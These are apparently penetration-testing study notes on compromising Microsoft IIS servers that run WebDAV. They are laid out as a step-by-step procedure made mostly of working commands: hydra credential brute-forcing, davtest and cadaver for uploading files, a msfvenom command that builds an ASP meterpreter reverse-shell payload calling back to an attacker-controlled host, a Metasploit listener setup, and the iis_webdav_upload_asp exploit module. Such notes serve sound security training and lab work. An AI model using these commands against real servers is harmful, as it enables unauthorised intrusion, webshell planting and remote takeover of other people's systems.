- default services : 
    - IIS/WebDav : 80/443
    - SMB : 445
    - WinRM : 5886/443/5986
    - RDP : 3389

- IIS : 
    - Web server for ASP/PHP 
    - file extension : php,asp,aspx,config
    - can have webdav as extension
    - nmap -sV --script=http-enum
    - tools : 
        - bruteforce : hydra -L USERNAMES -P PASSWORDS TARGET_IP http-get WEBDAV_DIRECTORY
        - davtest : 
            - check all authorized actions to the target 
            - syntax : davtest -url http[s]://TARGET_IP/WEBDAV_DIRECTORY -auth USERNAME:PASSWORD
        - cadaver : 
            - authenticate to webdav and allow managing file in the serve
            - syntax : cadaver http[s]://TARGET_IP/WEBDAV_DIRECTORY
                - provide username and password
                - put PAYLOAD_PATH
        - payload : 
            - /usr/share/webshells/
            - msfvenom -p windows/meterpreter/reverse_tcp LPORT 4444 LHOST ATTACKER_IP -f asp -o shell.asp
        - msfconsole :
            - exploit : windows/iis/iis_webdav_upload_asp
          
            - set PATH WEBDAV_DIRECTORY


- IIS : Internet Information Services
    - port 80/443
    - Alternative of Apache/Nginx
    - Supported executable file extensions : 
        - asp
        - aspx
        - config
        - php

- WEBDAV
    - port 80/443
    - Need legitimate credentials : Username:password
    - Exploitation: 
        - Identify whether webdav is running
        - Bruteforce credentials
        - upload payloads
    - Tools :
        - davtest : 
            - scan, authenticate and exploit WEBDAV
        - cadaver :
            - upload and manage files on webdav
            - running cadaver gives a

- Manually
    - nmap -sV --script=http-enum -p80 TARGET_IP
    - open in webbrowser
        http://TARGET_IP/WEBDAV_DIR/
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_HOST LPORT=4444 -f asp -o shell.asp
    - cadaver http://TARGET_IP/WEBDAV_DIR
    - put shell.asp
    - msfconsole
    - use multi/handler
    - set payload windows/meterpreter/reverse_tcp
        - always use the same payload as the payload sent to the webserver
    - set LHOST LOCAL_HOST
    - set LPORT 4444
    - run
    - Run the payload on the webdav directory on the server

- Metasploit module
    - msfconsole
    - search iis upload
    - use exploit/windows/iis/iis_webdav_upload_asp 
    - set HttpPassword PASSWORD
    - set HttpUsername USENAME
    - set RHOSTS TARGET_IP
    - set PATH /WEBDAV_DIR/
    - run
